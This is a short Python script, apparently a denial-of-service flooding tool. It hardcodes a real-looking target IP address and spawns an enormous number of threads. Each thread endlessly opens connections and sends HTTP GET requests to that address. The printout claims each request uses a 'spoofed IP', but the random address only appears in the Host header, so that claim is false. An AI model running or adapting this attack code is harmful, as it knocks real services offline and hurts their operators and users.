import socket
import threading
import random

target = '38.27.122.110'
dot = str('.')
a = str(random.randint(0,255))
b = str(random.randint(0,255))
c = str(random.randint(0,255))
d = str(random.randint(0,255))
fake_ip = str(a + dot + b + dot + c + dot + d) or personalizedIP
threads = 99999999999
port = 80

attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        
        s.close()

for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
    
    print('Number of threads are: '+ str(i) + ', The details of each one are: ' + str(thread) + ', with this spoofed IP adress: '+ str(fake_ip))
